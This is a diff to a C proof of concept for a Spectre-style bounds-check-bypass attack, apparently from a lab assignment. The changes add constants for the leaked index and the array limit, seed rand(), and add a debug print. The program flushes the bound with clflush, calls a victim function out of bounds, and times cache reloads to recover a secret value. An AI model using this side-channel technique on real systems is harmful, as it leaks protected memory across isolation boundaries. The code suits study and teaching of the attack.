@@ -2,14 +2,17 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <sys/mman.h>
+#include <time.h>
 
 #define BUFF_SIZE (1 << 21)
 #define NUM_TAGS (1 << 9)
 #define TAG_OFFSET 12
 #define THRESHOLD 100 // cache hit threshold
+#define SECRET_ARRAY_LIMIT 20
+#define INDEX_TO_LEAK 47
 
 int i, j;
-int limit = 20;
+int limit = SECRET_ARRAY_LIMIT;
 uint64_t access_time[NUM_TAGS];
 
 // Write your victim function here
@@ -40,6 +43,9 @@ int main(int argc, char **argv)
     // so later access will not suffer from such overhead.
     *((char *)huge_page) = 1; // dummy write to trigger page allocation
 
+    // set rand() seed for randomization between program runs
+    srand(time(NULL));
+
 
     // STEP 1: Allocate an array into the mmap
     int *secret_array = (int *)huge_page;
@@ -63,7 +69,7 @@ int main(int argc, char **argv)
     // STEP 4: Call victim function again with bounds bypass value
     clflush((void *) &limit);
     asm volatile("mfence"); // critical, attack does not work without fence
-    vict_func(huge_page, secret_array, 47);
+    vict_func(huge_page, secret_array, INDEX_TO_LEAK);
 
     // STEP 5: Reload mmap to see load times
     for (i = 0; i < NUM_TAGS; i++)
@@ -71,8 +77,10 @@ int main(int argc, char **argv)
 
     // Find secret value
     for (i = 0; i < NUM_TAGS; i++) {
-	if (access_time[i] < THRESHOLD)
+	if (access_time[i] < THRESHOLD) {
+	    //printf("From secret array: %d\n", secret_array[INDEX_TO_LEAK]);
 	    printf("Secret Value: %d\n", i);
+	}
     }
 
     return 0;
